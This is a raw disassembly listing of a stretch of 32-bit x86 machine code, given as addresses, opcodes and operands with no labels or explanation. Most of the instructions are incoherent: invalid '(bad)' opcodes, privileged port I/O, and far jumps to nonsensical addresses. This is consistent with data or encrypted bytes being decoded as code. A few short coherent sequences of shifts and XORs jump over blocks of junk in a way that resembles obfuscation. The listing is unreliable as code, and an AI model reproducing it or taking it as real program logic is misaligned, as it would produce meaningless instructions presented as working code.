  419ebf:	dec    ebx
  419ec0:	(bad)  
  419ec1:	fsub   QWORD PTR [ebx]
  419ec3:	mov    ecx,0x20701661
  419ec8:	xchg   DWORD PTR [edx+ebp*4],ebp
  419ecb:	mov    ecx,edx
  419ecd:	mov    al,ds:0x7a526373
  419ed2:	dec    eax
  419ed3:	jb     0x419e8e
  419ed5:	mov    ebx,0xec639cab
  419eda:	and    ebx,ebx
  419edc:	cwde   
  419edd:	(bad)  
  419ede:	pop    ebp
  419edf:	adc    DWORD PTR [edi+edi*4-0x1db6075d],0x47
  419ee7:	cmc    
  419ee8:	sub    al,0xa8
  419eea:	xor    BYTE PTR [ebx-0x45],bh
  419eed:	imul   esp,eax,0xce81645f
  419ef3:	mov    ch,0xb6
  419ef5:	std    
  419ef6:	jns    0x419e8a
  419ef8:	ror    edx,0x99
  419efb:	xor    edi,DWORD PTR [esi+eax*8]
  419efe:	pusha  
  419eff:	add    eax,0x2bd3b811
  419f04:	cdq    
  419f05:	scas   al,BYTE PTR es:[edi]
  419f06:	lds    eax,FWORD PTR [ebx-0xc]
  419f09:	mov    ecx,0x9bbb0c8d
  419f0e:	mov    dl,0xee
  419f10:	push   esp
  419f11:	jb     0x419f8a
  419f13:	mov    bl,0x6a
  419f15:	jecxz  0x419eed
  419f17:	or     cl,BYTE PTR [ebx]
  419f19:	inc    ebx
  419f1a:	adc    esi,esp
  419f1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f1d:	dec    eax
  419f1e:	adc    ecx,eax
  419f20:	dec    edx
  419f21:	cmp    eax,0x62a0ea68
  419f26:	inc    esi
  419f27:	pop    ds
  419f28:	enter  0xe59d,0xa0
  419f2c:	mov    gs,edi
  419f2e:	test   eax,0x449c00b0
  419f33:	arpl   WORD PTR [esi+0x6b],di
  419f36:	xor    ecx,edx
  419f38:	mov    bh,0xc7
  419f3a:	sub    BYTE PTR [ecx-0x4122f7c8],cl
  419f40:	ret    
  419f41:	cmp    cl,al
  419f43:	mov    dh,0x4b
  419f45:	call   0xc956116d
  419f4a:	jecxz  0x419f80
  419f4c:	inc    ecx
  419f4d:	das    
  419f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f4f:	push   ds
  419f50:	sub    al,cl
  419f52:	lock xor ch,dh
  419f55:	repnz test ebx,0x543b2c54
  419f5c:	push   0x1b
  419f5e:	or     al,BYTE PTR [edx+0x1c]
  419f61:	ss out dx,eax
  419f63:	xlat   BYTE PTR ds:[ebx]
  419f64:	mov    ds:0x85e80f8,eax
  419f69:	jbe    0x419f10
  419f6b:	call   0x8f49:0x2de437d9
  419f72:	add    DWORD PTR [edx+0x71],ebx
  419f75:	sti    
  419f76:	jb     0x419ff2
  419f78:	mov    ebx,0xa5b6a178
  419f7d:	sti    
  419f7e:	ins    DWORD PTR es:[edi],dx
  419f7f:	fdivr  QWORD PTR [edi+0x5]
  419f82:	cmp    bh,BYTE PTR [ebp+eiz*2-0x29cf8ffc]
  419f89:	in     al,0x4c
  419f8b:	mul    DWORD PTR [edx+0x60591339]
  419f91:	repz push 0x3d2553ad
  419f97:	add    al,0xc3
  419f99:	adc    al,0x21
  419f9b:	sub    dh,BYTE PTR [esi+0x69]
  419f9e:	inc    esi
  419f9f:	jo     0x41a00f
  419fa1:	xor    edx,edx
  419fa3:	xchg   edx,eax
  419fa4:	sbb    esi,DWORD PTR [esp+edi*4-0x7f473c1]
  419fab:	sbb    ch,0xe5
  419fae:	jp     0x419f35
  419fb0:	gs jp  0x419fac
  419fb3:	push   0x6d0cb942
  419fb8:	and    esi,DWORD PTR [edx-0x294b239a]
  419fbe:	push   0xc46cf42d
  419fc3:	jle    0x419fca
  419fc5:	cli    
  419fc6:	les    ebx,FWORD PTR [esi+0x28]
  419fc9:	dec    esp
  419fca:	fld    TBYTE PTR [edi-0x78]
  419fcd:	mov    BYTE PTR ds:0xb7216214,dh
  419fd3:	xchg   ecx,eax
  419fd4:	dec    ebx
  419fd5:	dec    edi
  419fd6:	cli    
  419fd7:	in     al,0x4
  419fd9:	jb     0x419f73
  419fdb:	or     esi,DWORD PTR [edx+0x2cceac9f]
  419fe1:	dec    edx
  419fe2:	out    0xc7,eax
  419fe4:	arpl   WORD PTR [edi+0x3b],ax
  419fe7:	jnp    0x41a036
  419fe9:	jnp    0x41a037
  419feb:	xor    edx,DWORD PTR [ebx+0x67]
  419fee:	imul   esi,DWORD PTR [ecx],0x93f80de
  419ff4:	add    BYTE PTR [eax+0x34],al
  419ff7:	add    DWORD PTR [ebp-0x4c],0xffffff8f
  419ffb:	inc    esi
  419ffc:	jg     0x419fef
  419ffe:	jns    0x419fad
  41a000:	stos   DWORD PTR es:[edi],eax
  41a001:	fst    DWORD PTR [ebx-0x27dfbfb6]
  41a007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a008:	push   ecx
  41a009:	mov    ah,0x53
  41a00b:	std    
  41a00c:	push   esp
  41a00d:	repnz scas eax,DWORD PTR es:[edi]
  41a00f:	sbb    edi,eax
  41a011:	dec    ebp
  41a012:	mov    ecx,0x8b5bfd6d
  41a017:	out    0x88,al
  41a019:	pop    ebp
  41a01a:	popf   
  41a01b:	sub    ch,BYTE PTR ds:0x8b283e39
  41a022:	mov    dh,BYTE PTR [edx-0x38]
  41a025:	and    esp,DWORD PTR [ecx-0x36]
  41a028:	fiadd  WORD PTR [edi]
  41a02a:	mov    ds:0x791183bf,al
  41a02f:	push   esp
  41a030:	mov    eax,0x7da31888
  41a035:	inc    esi
  41a036:	xor    bl,BYTE PTR [ebx-0x30]
  41a039:	sub    al,0xf8
  41a03b:	mov    edx,0xddd489ec
  41a040:	dec    eax
  41a041:	jbe    0x41a00b
  41a043:	xor    ch,BYTE PTR [esi]
  41a045:	ins    BYTE PTR es:[edi],dx
  41a046:	(bad)  [ebx+0x3e023d2]
  41a04c:	jecxz  0x41a025
  41a04e:	jnp    0x419fd2
  41a050:	neg    DWORD PTR [ecx-0x32883fdb]
  41a056:	loop   0x41a003
  41a058:	push   ecx
  41a059:	(bad)  
  41a05a:	and    al,BYTE PTR [ebx-0x30]
  41a05d:	int    0x36
  41a05f:	push   esi
  41a060:	addr16 sbb al,0xdd
  41a063:	(bad)  
  41a064:	js     0x41a032
  41a066:	pusha  
  41a067:	je     0x41a0af
  41a069:	add    eax,0x1201d218
  41a06e:	and    al,0x1e
  41a070:	aas    
  41a071:	test   al,0xcd
  41a073:	popa   
  41a074:	pop    edi
  41a075:	push   0xffffffa7
  41a077:	jmp    DWORD PTR [ebx-0xf]
  41a07a:	xchg   esp,ebp
  41a07c:	jl     0x41a004
  41a07e:	je     0x41a09c
  41a080:	mov    eax,0xfa2d1dd3
  41a085:	ins    DWORD PTR es:[edi],dx
  41a086:	ins    BYTE PTR es:[edi],dx
  41a087:	sahf   
  41a088:	or     ecx,edi
  41a08a:	adc    al,0x89
  41a08c:	sar    DWORD PTR [ecx+0x3a60e91b],1
  41a092:	xchg   BYTE PTR [eax+0x48b05d76],ah
  41a098:	pop    esi
  41a099:	shrd   ecx,edx,0x2
  41a09d:	xor    ecx,eax
  41a09f:	mov    eax,DWORD PTR [esp+0x18]
  41a0a3:	shr    edx,0x2
  41a0a6:	mov    edx,DWORD PTR [esp+0x1c]
  41a0aa:	xor    edx,edx
  41a0ac:	jmp    0x41a309
  41a0b1:	scas   ax,WORD PTR es:[edi]
  41a0b3:	xchg   ebx,eax
  41a0b4:	mov    dh,0x9c
  41a0b6:	mov    edx,0x94c4af6c
  41a0bb:	pop    esp
  41a0bc:	rcl    DWORD PTR [eax-0x67],1
  41a0bf:	push   eax
  41a0c0:	sahf   
  41a0c1:	mov    ebx,DWORD PTR [ebx]
  41a0c3:	sar    BYTE PTR [esi-0x41413dcb],0xcf
  41a0ca:	add    eax,0x9e708903
  41a0cf:	add    DWORD PTR [eax+ecx*1-0xbd27406],ebx
  41a0d6:	loope  0x41a146
  41a0d8:	int    0x6f
  41a0da:	jo     0x41a076
  41a0dc:	loop   0x41a0ac
  41a0de:	cmp    edi,esp
  41a0e0:	pop    ss
  41a0e1:	imul   eax,DWORD PTR [ebp+0x5c],0xd5bbbd55
  41a0e8:	mov    dh,0xca
  41a0ea:	pop    eax
  41a0eb:	inc    ebp
  41a0ec:	cld    
  41a0ed:	cmp    BYTE PTR ds:0x7efef88c,al
  41a0f3:	bound  edi,QWORD PTR [ebp-0x31]
  41a0f6:	inc    ecx
  41a0f7:	mov    esi,0xaa3487c4
  41a0fc:	jle    0x41a0d7
  41a0fe:	fstp   TBYTE PTR [ebp+0x42]
  41a101:	inc    eax
  41a102:	je     0x41a099
  41a104:	mov    bl,BYTE PTR [edi+0x7b6f2f2f]
  41a10a:	mov    bh,0x27
  41a10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a10d:	dec    edx
  41a10e:	nop
  41a10f:	pop    ebp
  41a110:	cmp    eax,0x643b50
  41a115:	(bad)  
  41a116:	mov    BYTE PTR [esi],al
  41a118:	sbb    dh,BYTE PTR [ebp+0x53]
  41a11b:	cwde   
  41a11c:	lock stc 
  41a11e:	mov    ds:0xe84b4bfe,al
  41a123:	imul   esp,DWORD PTR [edx-0x55722ca5],0xe008a4d8
  41a12d:	mov    dl,0xd9
  41a12f:	cmp    eax,0x7192867d
  41a134:	push   0xffffffa4
  41a136:	jge    0x41a0ef
  41a138:	xor    eax,0x11614fec
  41a13d:	fimul  DWORD PTR [ecx]
  41a13f:	mov    esi,0x1c3c22eb
  41a144:	fs pop esi
  41a146:	add    ebp,DWORD PTR [edi-0x5ced1177]
  41a14c:	mov    ebx,0x67a1778d
  41a151:	out    dx,eax
  41a152:	aam    0xe7
  41a154:	daa    
  41a155:	inc    esi
  41a156:	das    
  41a157:	jp     0x41a1a2
  41a159:	dec    edx
  41a15a:	or     ch,al
  41a15c:	test   eax,0xcee73da
  41a161:	xchg   ebp,eax
  41a162:	frstor [eax+0x4f0bba40]
  41a168:	cmc    
  41a169:	rcl    ebp,0xdd
  41a16c:	inc    ecx
  41a16d:	xor    al,0x38
  41a16f:	std    
  41a170:	jnp    0x41a188
  41a172:	dec    esi
  41a173:	add    DWORD PTR [eax+0x44],esi
  41a176:	push   edi
  41a177:	int    0xe6
  41a179:	jne    0x41a178
  41a17b:	cmc    
  41a17c:	xchg   ecx,eax
  41a17d:	neg    esp
  41a17f:	call   0xf09:0xc145b11c
  41a186:	add    edi,DWORD PTR [ecx-0x4842cc2]
  41a18c:	dec    edi
  41a18d:	call   0xced8:0x5060
  41a193:	shl    bl,cl
  41a195:	and    eax,DWORD PTR [esi+0x4bb53c]
  41a19b:	retf   
  41a19c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a19d:	inc    edx
  41a19e:	xor    dh,BYTE PTR [esp+ecx*8-0x66]
  41a1a2:	fcomp  DWORD PTR [edx]
  41a1a4:	sbb    BYTE PTR [esi-0x19],0xf8
  41a1a8:	into   
  41a1a9:	dec    ecx
  41a1aa:	test   eax,0xc689268c
  41a1af:	out    dx,eax
  41a1b0:	push   ebx
  41a1b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1b2:	jmp    0xf0a63b54
  41a1b7:	pop    es
  41a1b8:	xchg   edx,edx
  41a1ba:	sub    al,0xd8
  41a1bc:	or     cl,BYTE PTR [edi]
  41a1be:	fld    TBYTE PTR ds:0xc1d36e52
  41a1c4:	sbb    dh,al
  41a1c6:	xlat   BYTE PTR ds:[ebx]
  41a1c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1c8:	vpaddb ymm1,ymm7,ymm1
  41a1cc:	lds    edi,FWORD PTR [esi+0x79]
  41a1cf:	jo     0x41a1da
  41a1d1:	ins    BYTE PTR es:[edi],dx
  41a1d2:	gs jle 0x41a21c
  41a1d5:	into   
  41a1d6:	xchg   ebx,eax
  41a1d7:	xor    esp,DWORD PTR [edi+edi*8-0x7f0e11fa]
  41a1de:	adc    eax,0x298aa325
  41a1e3:	adc    DWORD PTR [ebp+edi*2+0x27],edx
  41a1e7:	mov    ch,BYTE PTR [edi+0xc]
  41a1ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1eb:	xor    bh,ch
  41a1ed:	inc    edx
  41a1ee:	test   DWORD PTR [edx+0x2],0x2e251328
  41a1f5:	imul   eax,DWORD PTR [ebx-0x36],0x2c
  41a1f9:	sbb    ebp,DWORD PTR [esi-0x727d718]
  41a1ff:	iret   
  41a200:	dec    eax
  41a202:	inc    edx
  41a203:	mov    ds:0x96621b45,eax
  41a208:	in     eax,0x29
  41a20a:	out    0x7a,al
  41a20c:	data16 xor BYTE PTR [edx],bh
  41a20f:	aas    
  41a210:	mov    bh,0x67
  41a212:	(bad)  
  41a214:	and    eax,DWORD PTR [eax-0x3c]
  41a217:	test   DWORD PTR [eiz*8-0x44fe3599],0x687aa9ef
  41a222:	adc    BYTE PTR [edx+0x6],bl
  41a225:	mov    dh,0x78
  41a227:	xor    al,0xe7
  41a229:	loop   0x41a204
  41a22b:	mov    ds:0x36cd503b,al
  41a230:	mov    eax,0x56b96daf
  41a235:	push   ecx
  41a236:	popf   
  41a237:	cld    
  41a238:	ror    DWORD PTR [ebx-0xda11f1],1
  41a23e:	mov    esi,0x1adbab65
  41a243:	xchg   edx,eax
  41a244:	jl     0x41a1ef
  41a246:	and    DWORD PTR [eax*4-0x757d0fbd],esi
  41a24d:	loope  0x41a232
  41a24f:	sub    al,0x3
  41a251:	addr16 adc dh,bl
  41a254:	sub    DWORD PTR [ecx+edi*2+0x35db59f3],esp
  41a25b:	adc    eax,0xa9df97a7
  41a260:	test   eax,0x7d634e2d
  41a265:	cmc    
  41a266:	clc    
  41a267:	(bad)  
  41a26a:	mov    ah,0xd7
  41a26c:	nop
  41a26d:	outs   dx,DWORD PTR ds:[esi]
  41a26e:	dec    ebx
  41a26f:	adc    edx,DWORD PTR [ecx+0x1dac8d17]
  41a275:	rol    DWORD PTR [ecx-0x10b32833],0x8e
  41a27c:	popf   
  41a27d:	xchg   DWORD PTR [edi-0x57ca7102],esi
  41a283:	pop    eax
  41a284:	jne    0x41a290
  41a286:	mov    al,ds:0x9d4ecbc3
  41a28b:	jmp    0x15af927e
  41a290:	dec    edx
  41a291:	mov    eax,0x6759d81f
  41a296:	push   ebp
  41a297:	and    bh,BYTE PTR [ebx+0x38b3f28c]
  41a29d:	or     al,0x26
  41a29f:	stos   DWORD PTR es:[edi],eax
  41a2a0:	int3   
  41a2a1:	sti    
  41a2a2:	add    DWORD PTR [ebp+0xf],ebp
  41a2a5:	in     eax,dx
  41a2a6:	repz cmp BYTE PTR [edi+0x2e],bl
  41a2aa:	sbb    edi,DWORD PTR ds:0x44372927
  41a2b0:	ret    
  41a2b1:	paddq  mm0,mm2
  41a2b4:	fsubr  QWORD PTR [ecx]
  41a2b6:	push   ds
  41a2b7:	stc    
  41a2b8:	cvtps2pd xmm7,QWORD PTR [ecx-0x2c308a2f]
  41a2bf:	dec    di
  41a2c1:	cmp    BYTE PTR [ecx+0x498eb4d1],al
  41a2c7:	sbb    BYTE PTR ds:0x69fcd01e,cl
  41a2cd:	and    DWORD PTR [ebp+ebp*2+0x43],edx
  41a2d1:	or     ch,dh
  41a2d3:	cli    
  41a2d4:	loop   0x41a33b
  41a2d6:	inc    edi
  41a2d7:	punpckhwd mm0,QWORD PTR [edi-0x43644891]
  41a2de:	push   esp
  41a2df:	pop    esi
  41a2e0:	cli    
  41a2e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2e2:	fldenv [edx-0x11]
  41a2e5:	movlhps xmm3,xmm7
  41a2e8:	outs   dx,DWORD PTR ds:[esi]
  41a2e9:	pop    edx
  41a2ea:	rcr    DWORD PTR [ecx-0x169318bf],1
  41a2f0:	xor    dl,BYTE PTR gs:[eax+0x7b]
  41a2f4:	outs   dx,BYTE PTR ds:[esi]
  41a2f5:	popa   
  41a2f6:	xchg   ebx,eax
  41a2f7:	(bad)  
  41a2f8:	push   ss
  41a2f9:	clc    
  41a2fa:	adc    al,0x69
  41a2fc:	std    
  41a2fd:	loop   0x41a2d0
  41a2ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a300:	push   edi
  41a301:	iret   
  41a302:	ins    DWORD PTR es:[edi],dx
  41a303:	jno    0x41a328
  41a305:	pop    ebp
  41a306:	repz inc esp
  41a308:	dec    edi
  41a309:	or     edx,ecx
  41a30b:	push   edx
  41a30c:	push   esi
  41a30d:	shl    eax,0x1e
  41a310:	push   edi
  41a311:	lea    eax,[esp+0x7c]
  41a315:	push   eax
  41a316:	lea    eax,[esp+0x28]
  41a31a:	push   eax
  41a31b:	call   0x411472
  41a320:	push   DWORD PTR [esp+0x74]
  41a324:	push   DWORD PTR [esp+0x74]
  41a328:	push   DWORD PTR [esp+0x24]
  41a32c:	push   DWORD PTR [esp+0x24]
  41a330:	call   0x412349
  41a335:	mov    edx,DWORD PTR [esp+0x18]
  41a339:	mov    eax,DWORD PTR [esp+0x1c]
  41a33d:	mov    ecx,DWORD PTR [esp+0x18]
  41a341:	mov    edi,DWORD PTR [esp+0x1c]
  41a345:	shrd   edx,eax,0x2
  41a349:	shr    eax,0x2
  41a34c:	shl    ecx,0x1e
  41a34f:	xor    ecx,ecx
  41a351:	mov    eax,0x32de6d5d
  41a356:	xor    edx,eax
  41a358:	or     ecx,edx
  41a35a:	mov    edx,DWORD PTR [esp+0x5c]
  41a35e:	mov    DWORD PTR [edx],ecx
  41a360:	mov    ecx,DWORD PTR [esp+0x18]
  41a364:	jmp    0x41a5c1
  41a369:	repz sub cl,0x71
  41a36d:	mov    edx,0x20807cbb
  41a372:	shl    al,cl
  41a374:	iret   
  41a375:	pop    esi
  41a376:	inc    esp
  41a377:	inc    eax
  41a378:	fld    QWORD PTR [edi+ebx*1]
  41a37b:	sar    BYTE PTR [esi-0x41413dcb],0x96
  41a382:	ffree  st(0)
  41a384:	mov    dl,BYTE PTR [eax+0x7ce9475c]
  41a38a:	daa    
  41a38b:	hlt    
  41a38c:	ja     0x41a358
  41a38e:	imul   DWORD PTR [edx+0x19]
  41a391:	xor    eax,0xab57040d
  41a396:	fsubr  QWORD PTR [ebx+0x46]
  41a399:	inc    edi
  41a39a:	mov    ecx,0xf68f29b7
  41a39f:	add    al,0xaa
  41a3a1:	mov    edx,0xb4a31939
  41a3a6:	mov    DWORD PTR [ecx-0x36eb7cac],edi
  41a3ac:	ins    DWORD PTR es:[edi],dx
  41a3ad:	mov    ds:0xc5a582f5,al
  41a3b2:	ja     0x41a386
  41a3b4:	push   es
  41a3b5:	xlat   BYTE PTR gs:[ebx]
  41a3b7:	loopne 0x41a3b1
  41a3b9:	mov    ds:0xd7117758,eax
  41a3be:	mov    ch,0xba
  41a3c0:	test   al,0x33
  41a3c2:	repz pop esi
  41a3c4:	cdq    
  41a3c5:	inc    ebp
  41a3c6:	mov    cl,0xfa
  41a3c8:	or     dh,BYTE PTR [ecx+0x7]
  41a3cb:	das    
  41a3cc:	loop   0x41a396
  41a3ce:	je     0x41a42c
  41a3d0:	or     sp,bp
  41a3d3:	ins    BYTE PTR es:[edi],dx
  41a3d4:	mov    dh,BYTE PTR [ebx+ebp*2-0x7767f49a]
  41a3db:	xchg   ebx,eax
  41a3dc:	imul   esi,edx,0xb7caf35c
  41a3e2:	into   
  41a3e3:	cli    
  41a3e4:	xlat   BYTE PTR ds:[ebx]
  41a3e5:	mov    eax,0x55e2e8ac
  41a3ea:	ja     0x41a3e3
  41a3ec:	and    BYTE PTR [esi],0x17
  41a3ef:	sbb    dl,dl
  41a3f1:	sbb    DWORD PTR [eax-0x53],ebx
  41a3f4:	push   ds
  41a3f5:	push   ss
  41a3f6:	or     eax,0x6efcca63
  41a3fb:	fisubr DWORD PTR [ebx+0x10]
  41a3fe:	iret   
  41a3ff:	cmp    esi,esi
  41a401:	fwait
  41a402:	retf   0x5a0a
  41a405:	adc    edx,ecx
  41a407:	and    al,0x4c
  41a409:	adc    edx,DWORD PTR [esp+eax*8-0x6ae4dd7e]
  41a410:	xchg   esp,eax
  41a411:	xchg   BYTE PTR [edi],bl
  41a413:	sbb    BYTE PTR [edx-0x53648eb2],al
  41a419:	ret    0x7a8b
  41a41c:	adc    al,0x47
  41a41e:	ret    0xfab0
  41a421:	in     eax,0x38
  41a423:	add    BYTE PTR ds:0xba5b781e,ah
  41a429:	push   ecx
  41a42a:	aas    
  41a42b:	pop    ecx
  41a42c:	jae    0x41a494
  41a42e:	add    al,0x59
  41a430:	adc    ecx,ebx
  41a432:	and    esp,0x3b9a632
  41a438:	dec    edx
  41a439:	or     BYTE PTR [ebx],dl
  41a43b:	icebp  
  41a43c:	das    
  41a43d:	xor    BYTE PTR [edx+0x1f],0x4c
  41a441:	fldenv [eax]
  41a443:	inc    esi
  41a444:	lods   eax,DWORD PTR ds:[esi]
  41a445:	and    BYTE PTR [ecx+0x5f],ch
  41a448:	(bad)  
  41a449:	cli    
  41a44a:	cs popf 
  41a44c:	lea    ebx,[ebp+0x71]
  41a44f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a450:	int    0xcf
  41a452:	jle    0x41a41a
  41a454:	pop    edx
  41a455:	lods   al,BYTE PTR cs:[esi]
  41a457:	adc    bl,BYTE PTR [ecx+edx*8-0x5710b2c5]
  41a45e:	xchg   ecx,eax
  41a45f:	jns    0x41a47a
  41a461:	retf   
  41a462:	sub    al,0xad
  41a464:	pop    edi
  41a465:	(bad)  
  41a466:	repnz adc DWORD PTR [edi-0xd],ebp
  41a46a:	outs   dx,BYTE PTR ds:[esi]
  41a46b:	cli    
  41a46c:	gs int3 
  41a46e:	xchg   edx,eax
  41a46f:	shl    DWORD PTR [ebx],0x24
  41a472:	scas   eax,DWORD PTR es:[edi]
  41a473:	das    
  41a474:	fisttp QWORD PTR [eax+0x11]
  41a477:	jmp    0x801ae5ee
  41a47c:	mov    BYTE PTR [esi],al
  41a47e:	into   
  41a47f:	jmp    0x263f:0xdf716d84
  41a486:	adc    DWORD PTR [esi+edi*4+0x5c3fcbd9],esp
  41a48d:	test   eax,0xd18da5f5
  41a492:	fistp  WORD PTR [edi+ecx*8+0x233978fe]
  41a499:	xchg   DWORD PTR ds:0xf663fc86,edi
  41a49f:	xchg   ecx,eax
  41a4a0:	jmp    0x41a4ed
  41a4a2:	test   eax,0x99cf392b
  41a4a7:	call   0x3b2dd4ab
  41a4ac:	mov    bl,0xac
  41a4ae:	bound  ecx,QWORD PTR [ebp-0x6a]
  41a4b1:	test   dl,dl
  41a4b3:	pop    ebp
  41a4b4:	(bad)  
  41a4b5:	sub    ebx,DWORD PTR ds:0x92a3744
  41a4bb:	adc    ebx,DWORD PTR [ebx-0x4ee658c1]
  41a4c1:	repnz out dx,eax
  41a4c3:	ins    BYTE PTR es:[edi],dx
  41a4c4:	mov    dh,0xd9
  41a4c6:	and    eax,0x6036e790
  41a4cb:	pop    edx
  41a4cc:	sbb    eax,0x9e6f8d2c
  41a4d1:	mov    BYTE PTR [ecx-0x63],bl
  41a4d4:	cmp    BYTE PTR ds:[edx+eiz*8+0x2d],dl
  41a4d9:	dec    ecx
  41a4da:	jecxz  0x41a483
  41a4dc:	sub    BYTE PTR [eax+eax*1-0x6f73093f],bh
  41a4e3:	and    DWORD PTR [edi-0x1a9b613a],0xf0464994
  41a4ed:	jmp    0xb54f:0xaa4b43a2
  41a4f4:	adc    eax,0x6936f834
  41a4f9:	loopne 0x41a540
  41a4fb:	xlat   BYTE PTR ds:[ebx]
  41a4fc:	pop    eax
  41a4fd:	pop    es
  41a4fe:	xlat   BYTE PTR ds:[ebx]
  41a4ff:	lods   eax,DWORD PTR ds:[esi]
  41a500:	mov    DWORD PTR ds:0xf9bab14c,0x37e63ff5
  41a50a:	xchg   ecx,eax
  41a50b:	ja     0x41a4c3
  41a50d:	sti    
  41a50e:	jno    0x41a508
  41a510:	mov    bl,0x33
  41a512:	dec    ebp
  41a513:	je     0x41a513
  41a515:	push   edx
  41a516:	scas   eax,DWORD PTR es:[edi]
  41a517:	pop    ebx
  41a518:	inc    esp
  41a519:	aam    0xe
  41a51b:	cld    
  41a51c:	dec    edi
  41a51d:	sti    
  41a51e:	push   0xffffffb3
  41a520:	outs   dx,BYTE PTR ds:[esi]
  41a521:	or     esi,DWORD PTR [edx-0x38]
  41a524:	mov    edi,0xd6979f72
  41a529:	xor    al,0x76
  41a52b:	xchg   esi,eax
  41a52c:	dec    ebp
  41a52d:	mov    esp,cs
  41a52f:	sbb    DWORD PTR [esi+eax*8-0x65213c5e],edi
  41a536:	fdiv   QWORD PTR [ecx-0x56]
  41a539:	xor    edi,DWORD PTR [ecx+0x4b]
  41a53c:	sahf   
  41a53d:	mov    ebx,0x958ca518
  41a542:	mov    WORD PTR [edx],es
  41a544:	lock push 0x4c30c943
  41a54a:	pop    edx
  41a54b:	push   ebx
  41a54c:	imul   esp,DWORD PTR [eax-0x39],0x9d5a21e7
  41a553:	xchg   ebp,eax
  41a554:	in     eax,dx
  41a555:	icebp  
  41a556:	icebp  
  41a557:	push   eax
  41a558:	dec    ebx
  41a559:	mov    WORD PTR [edx+0x93fb78],cs
  41a55f:	loop   0x41a59e
  41a561:	add    BYTE PTR [eax],0x92
  41a564:	dec    edi
  41a565:	pop    esi
  41a566:	stos   DWORD PTR es:[edi],eax
  41a567:	jbe    0x41a5b3
  41a569:	cmpps  xmm0,XMMWORD PTR [edi-0x8],0x4f
  41a56e:	mov    cl,cl
  41a570:	adc    al,0x6d
  41a572:	jp     0x41a5b3
  41a574:	jge    0x41a58b
  41a576:	loop   0x41a5e9
  41a578:	xchg   esi,eax
  41a579:	ss scas eax,DWORD PTR es:[edi]
  41a57b:	xor    ch,BYTE PTR [edi+0x14]
  41a57e:	es loop 0x41a5be
  41a581:	sar    DWORD PTR [edx+0x530f7b01],cl
  41a587:	or     DWORD PTR [edx-0xb],ebx
  41a58a:	out    0x43,al
  41a58c:	mov    al,0x7d
  41a58e:	data16 std 
  41a590:	shl    ch,cl
  41a592:	mov    ds:0x223161bc,al
  41a597:	mov    eax,ds
  41a599:	icebp  
  41a59a:	dec    ebp
  41a59b:	leave  
  41a59c:	loopne 0x41a586
  41a59e:	call   0xcb34240c
  41a5a3:	fadd   st(2),st
  41a5a5:	inc    eax
  41a5a6:	cld    
  41a5a7:	repnz adc al,0x43
  41a5aa:	dec    eax
  41a5ab:	sbb    BYTE PTR [esi-0x2e],0xde
  41a5af:	pop    esi
  41a5b0:	adc    ebx,0xb861d9be
  41a5b6:	and    dh,BYTE PTR [edx-0x44211e21]
  41a5bc:	xchg   edi,eax
  41a5bd:	push   ss
  41a5be:	sbb    eax,DWORD PTR [eax+0x3f]
  41a5c1:	mov    edx,DWORD PTR [esp+0x1c]
  41a5c5:	shrd   ecx,edx,0x2
  41a5c9:	xor    ecx,eax
  41a5cb:	mov    eax,DWORD PTR [esp+0x18]
  41a5cf:	shl    eax,0x1e
  41a5d2:	shr    edx,0x2
  41a5d5:	mov    edx,DWORD PTR [esp+0x1c]
  41a5d9:	xor    eax,eax
  41a5db:	or     eax,ecx
  41a5dd:	mov    ecx,DWORD PTR [esp+0x68]
  41a5e1:	mov    DWORD PTR [ecx],eax
  41a5e3:	mov    eax,DWORD PTR [esp+0x68]
  41a5e7:	mov    ecx,DWORD PTR [esp+0x68]
  41a5eb:	mov    eax,DWORD PTR [eax]
  41a5ed:	cmp    eax,DWORD PTR [ecx]
  41a5ef:	jne    0x41a916
  41a5f5:	mov    eax,DWORD PTR [esp+0x5c]
  41a5f9:	mov    ecx,DWORD PTR [esp+0x5c]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	cmp    eax,DWORD PTR [ecx]
  41a601:	jne    0x41a916
  41a607:	mov    BYTE PTR [esp+0x2c],0x20
  41a60c:	mov    BYTE PTR [esp+0x38],0x3
  41a611:	jmp    0x41a86e
  41a616:	cs lock pop ebp
  41a619:	jne    0x41a5ba
  41a61b:	js     0x41a653
  41a61d:	mov    eax,0x90d3c3ca
  41a622:	xchg   ebp,eax
  41a623:	sub    BYTE PTR [esi-0x6e],dh
  41a626:	jl     0x41a64b
  41a628:	sar    BYTE PTR [esi-0x41413dcb],0xf7
  41a62f:	push   ecx
  41a630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a631:	fisubr DWORD PTR ds:0x51350827
  41a637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a638:	(bad)  
  41a639:	sbb    cl,dh
  41a63b:	cmc    
  41a63c:	adc    dl,BYTE PTR [eax]
  41a63e:	test   BYTE PTR [edx+0x7eb4ddad],dl
  41a644:	ret    0x19ab
  41a647:	mov    bl,0x7a
  41a649:	je     0x41a69a
  41a64b:	(bad)  
  41a64c:	mov    WORD PTR [ecx],?
  41a64e:	or     DWORD PTR [esi-0x10],eax
  41a651:	add    BYTE PTR [eax+0x33],bh
  41a654:	into   
  41a655:	bound  esi,QWORD PTR [esi+ebp*2]
  41a658:	int3   
  41a659:	scas   eax,DWORD PTR es:[edi]
  41a65a:	imul   esp,DWORD PTR [edi],0xe397feb7
  41a660:	inc    esi
  41a661:	push   ds
  41a662:	inc    ecx
  41a663:	push   0xe52e2a02
  41a668:	inc    edi
  41a669:	mov    WORD PTR [edx],es
  41a66b:	cwde   
  41a66c:	into   
  41a66d:	fiadd  DWORD PTR [esi+0x7700d394]
  41a673:	xlat   BYTE PTR ds:[ebx]
  41a674:	xchg   edi,eax
  41a675:	mov    edx,0x5d9c4fb1
  41a67a:	pusha  
  41a67b:	inc    ebp
  41a67c:	add    dl,BYTE PTR [ebp-0x17526375]
  41a682:	int3   
